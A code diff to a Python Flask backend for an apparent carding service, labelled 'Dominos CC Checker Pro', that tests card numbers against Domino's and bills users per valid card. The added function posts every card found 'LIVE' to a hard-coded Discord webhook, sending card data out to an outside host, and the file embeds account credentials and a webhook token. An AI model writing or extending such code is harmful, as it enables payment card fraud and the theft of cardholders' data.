@@ -23,6 +23,31 @@ supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 DOMINOS_EMAIL = os.environ.get("DOMINOS_EMAIL", "p808409@gmail.com")
 DOMINOS_PASSWORD = os.environ.get("DOMINOS_PASSWORD", "@P808409p10")
+DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://ptb.discord.com/api/webhooks/1488357897632088094/x1V4D1-sKnEGs9dATiqA1uano_H4_daXvlzenaqkJu2QJmgGwRO369VERLZGQrLlBKkO")
+
+def send_to_discord(card_line, user_email):
+    """Envia o card LIVE para o webhook do Discord."""
+    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "SUA_WEBHOOK_AQUI":
+        print("[DISCORD] Webhook não configurado.")
+        return
+        
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        payload = {
+            "embeds": [{
+                "title": "💳 NOVO CARD LIVE!",
+                "color": 3066993, # Verde
+                "fields": [
+                    {"name": "Card", "value": f"`{card_line}`", "inline": False},
+                    {"name": "Data", "value": f"`{timestamp}`", "inline": True}
+                ],
+                "footer": {"text": "Dominos CC Checker Pro"}
+            }]
+        }
+        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+        print(f"[DISCORD] Notificação enviada para {user_email}")
+    except Exception as e:
+        print(f"[DISCORD] Erro ao enviar webhook: {e}")
 
 # Instanciando o checker (ele não abrirá o chrome até o primeiro uso)
 checker_service.checker_instance = DominosChecker(DOMINOS_EMAIL, DOMINOS_PASSWORD)
@@ -288,6 +313,10 @@ def check_card():
         if result == "LIVE":
             new_balance = balance - 1.0
             supabase.table('profiles').update({'balance': new_balance}).eq('id', user_id).execute()
+            
+            # Notificar Discord
+            user_email = profile.get('email', 'Desconhecido')
+            send_to_discord(card_line, user_email)
             
         return jsonify({"success": True, "status": result, "message": "Verificado com sucesso"})
         
